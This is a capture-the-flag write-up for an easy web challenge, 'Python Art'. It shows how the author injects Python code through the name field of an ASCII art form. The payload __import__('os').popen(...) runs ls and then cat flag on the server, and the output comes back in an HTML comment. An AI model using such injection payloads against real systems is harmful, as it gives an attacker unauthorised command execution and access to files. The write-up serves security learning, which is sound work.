
# Challenge Name: Python Art


![date](https://img.shields.io/badge/date-18.03.2021-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![crypto category](https://img.shields.io/badge/category-Web-blueviolet.svg)   
![level](https://img.shields.io/badge/level-Easy-blue.svg)
![score](https://img.shields.io/badge/score-50-blue.svg)



## Detailed solution

Let's open the challenge link http://18.196.160.18:3333/ . We have an ASCII art tool that take our input and convert it to ASCII art

![image](https://user-images.githubusercontent.com/72421091/113364096-8b5e2d00-934a-11eb-93af-05b86b5b5843.png)

Checking our request, it's a POST to /send with the data name = our input  

Let's check the page source after printing view-source:http://18.196.160.18:3333/send 

![image](https://user-images.githubusercontent.com/72421091/113364404-4d153d80-934b-11eb-8c3c-4636c14188e4.png)

We can see the printed data and a weird comment tag that contains the data used in request and "is not defined" 

I started exploiting the input, i used the os.popen() to execute "ls" command ```__import__('os').popen('ls').read()```  

After printing i checked the page source. At the comment tag we can see the command output 

```
    <!-- app.py
flag
static
templates
 -->
``` 

Let's modify our payload to read the **flag** file using cat ```__import__('os').popen('cat flag').read()``` 

Checking the page source and we found our flag   

```
    <!-- FLAG{Congratz_U_PWNED_MY_PANTING}
 -->
```

## Flag

```
FLAG{Congratz_U_PWNED_MY_PANTING}
```
